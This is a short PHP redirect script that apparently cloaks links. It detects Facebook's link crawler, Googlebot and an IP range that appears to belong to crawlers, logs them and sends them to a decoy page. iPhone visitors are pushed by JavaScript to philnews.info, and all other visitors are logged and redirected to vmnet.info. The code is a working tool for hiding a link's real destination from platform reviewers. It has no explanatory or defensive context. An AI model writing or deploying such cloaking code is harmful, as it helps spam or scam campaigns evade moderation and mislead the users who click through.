
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
    return json_decode($json)->country_code;
}

$country = checkCountry($_SERVER['REMOTE_ADDR']);

$allowedAgents = "allowedAgentsIhOkNiQf7UNAtW8ibCoDnDZTB9g2zj-PacXxJqpGmSBXx1Hd5J0Arb54wLt3asy4PwnuEFTMGoWKsLqu7MIgkZCm9FQ-jhOVRY8c.txt";
$blockedAgents = "blockedAgentsIhOkNiQf7UNAtW8ibCoDnDZTB9g2zj-PacXxJqpGmSBXx1Hd5J0Arb54wLt3asy4PwnuEFTMGoWKsLqu7MIgkZCm9FQ-jhOVRY8c.txt";

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://extremereader.pnnews.dev/IhOkNiQf7UNAtW8ibCoDnDZTB9g2zj-PacXxJqpGmSBXx1Hd5J0Arb54wLt3asy4PwnuEFTMGoWKsLqu7MIgkZCm9FQ-jhOVRY8c.html', true, 301);
    die();
} elseif (strpos($_SERVER["HTTP_USER_AGENT"], "iphone") !== false) {
  echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://philnews.info';
// ]]></script>
";
  die();
} else {
    $fAgent = fopen($allowedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://vmnet.info', true, 301);
    die();
}

